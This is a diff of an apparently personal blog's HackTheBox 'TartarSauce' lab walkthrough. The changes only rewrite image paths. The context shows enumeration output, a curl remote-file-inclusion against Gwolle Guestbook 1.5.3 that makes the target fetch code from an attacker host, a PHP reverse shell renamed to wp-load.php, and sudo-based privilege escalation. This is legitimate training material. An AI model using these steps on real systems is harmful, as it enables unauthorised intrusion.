@@ -33,7 +33,7 @@ PORT   STATE SERVICE VERSION
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 11.38 seconds
-</code></pre><ul><li>Web Server</li></ul><p><img src=./images/1.png></p><ul><li><code>feroxbuster</code></li></ul><pre tabindex=0><code>└─$ feroxbuster -u http://10.10.10.88/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,php,html --depth 2 
+</code></pre><ul><li>Web Server</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/tartarsauce/images/1.png></p><ul><li><code>feroxbuster</code></li></ul><pre tabindex=0><code>└─$ feroxbuster -u http://10.10.10.88/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,php,html --depth 2 
 
  ___  ___  __   __     __      __         __   ___
 |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
@@ -61,7 +61,7 @@ by Ben &#34;epi&#34; Risher 🤓                 ver: 2.10.0
 301      GET        9l       28w      319c http://10.10.10.88/webservices/wp =&gt; http://10.10.10.88/webservices/wp/
 200      GET        7l       12w      208c http://10.10.10.88/robots.txt
 301      GET        9l       28w      316c http://10.10.10.88/webservices =&gt; http://10.10.10.88/webservices/
-</code></pre><ul><li><code>http://10.10.10.88/webservices/wp/</code> is broken<ul><li>Add <code>10.10.10.88 tartarsauce.htb</code> to <code>/etc/hosts</code></li></ul></li></ul><p><img src=./images/2.png></p><p><img src=./images/3.png></p><ul><li><code>wpscan</code></li></ul><pre tabindex=0><code>└─$ wpscan --url http://10.10.10.88/webservices/wp/ --enumerate p --plugins-detection aggressive
+</code></pre><ul><li><code>http://10.10.10.88/webservices/wp/</code> is broken<ul><li>Add <code>10.10.10.88 tartarsauce.htb</code> to <code>/etc/hosts</code></li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/tartarsauce/images/2.png></p><p><img src=/posts/cybersecurity/hackthebox/machines/linux/tartarsauce/images/3.png></p><ul><li><code>wpscan</code></li></ul><pre tabindex=0><code>└─$ wpscan --url http://10.10.10.88/webservices/wp/ --enumerate p --plugins-detection aggressive
 _______________________________________________________________
          __          _______   _____
          \ \        / /  __ \ / ____|
@@ -161,7 +161,7 @@ Interesting Finding(s):
 [+] Data Received: 261.322 KB
 [+] Memory used: 200.883 MB
 [+] Elapsed time: 00:01:07
-</code></pre><h2 id=foothold>Foothold</h2><ul><li>We have few plugins installed<ul><li>http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt</li><li>If we check changelogs, we see that the actual version is <code>1.5.3</code></li></ul></li></ul><p><img src=./images/4.png></p><ul><li><a href=https://www.exploit-db.com/exploits/38861 target=_blank rel=noopener>RFI</a> in <code>1.5.3</code> version of <code>Gwolle Guestbook WordPress plugin</code><ul><li><code>curl http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.16.9/test</code></li></ul></li></ul><p><img src=./images/5.png></p><ul><li>I&rsquo;ll have to rename a reverse shell file to <code>wp-load.php</code><ul><li>I used <code>/usr/share/webshells/php/php-reverse-shell.php</code></li></ul></li></ul><p><img src=./images/6.png></p><h2 id=user>User</h2><ul><li><code>sudo</code> rights</li></ul><pre tabindex=0><code>www-data@TartarSauce:/var/www/html$ sudo -l
+</code></pre><h2 id=foothold>Foothold</h2><ul><li>We have few plugins installed<ul><li>http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt</li><li>If we check changelogs, we see that the actual version is <code>1.5.3</code></li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/tartarsauce/images/4.png></p><ul><li><a href=https://www.exploit-db.com/exploits/38861 target=_blank rel=noopener>RFI</a> in <code>1.5.3</code> version of <code>Gwolle Guestbook WordPress plugin</code><ul><li><code>curl http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.16.9/test</code></li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/tartarsauce/images/5.png></p><ul><li>I&rsquo;ll have to rename a reverse shell file to <code>wp-load.php</code><ul><li>I used <code>/usr/share/webshells/php/php-reverse-shell.php</code></li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/tartarsauce/images/6.png></p><h2 id=user>User</h2><ul><li><code>sudo</code> rights</li></ul><pre tabindex=0><code>www-data@TartarSauce:/var/www/html$ sudo -l
 Matching Defaults entries for www-data on TartarSauce:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
@@ -172,7 +172,7 @@ User www-data may run the following commands on TartarSauce:
 onuma@TartarSauce:/var/www/html$ id
 uid=1000(onuma) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev)
 onuma@TartarSauce:/var/www/html$ 
-</code></pre><h2 id=root>Root</h2><ul><li>I ran <code>pspy32</code></li></ul><p><img src=./images/7.png></p><ul><li>Content</li></ul><pre tabindex=0><code>onuma@TartarSauce:/tmp$ cat /usr/sbin/backuperer
+</code></pre><h2 id=root>Root</h2><ul><li>I ran <code>pspy32</code></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/tartarsauce/images/7.png></p><ul><li>Content</li></ul><pre tabindex=0><code>onuma@TartarSauce:/tmp$ cat /usr/sbin/backuperer
 #!/bin/bash
 
 #-------------------------------------------------------------------------------------
@@ -253,7 +253,7 @@ rm $filename
 rm -rf var
 
 tail -f /var/backups/onuma_backup_error.txt
-</code></pre><ul><li>As soon as we see an archive in <code>/var/tmp</code>, we execute our script and get our flag</li></ul><p><img src=./images/8.png></p></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
+</code></pre><ul><li>As soon as we see an archive in <code>/var/tmp</code>, we execute our script and get our flag</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/tartarsauce/images/8.png></p></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
 <a class="btn btn-sm twitter-btn" href="https://twitter.com/share?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2ftartarsauce%2f&text=%5bHTB%5d%20Machine%3a%20TartarSauce&via=Personal%20Blog" target=_blank><i class="fab fa-twitter"></i>
 </a><a class="btn btn-sm reddit-btn" href="https://reddit.com/submit?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2ftartarsauce%2f&title=%5bHTB%5d%20Machine%3a%20TartarSauce" target=_blank><i class="fab fa-reddit"></i>
 </a><a class="btn btn-sm linkedin-btn" href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2ftartarsauce%2f&title=%5bHTB%5d%20Machine%3a%20TartarSauce" target=_blank><i class="fab fa-linkedin"></i>
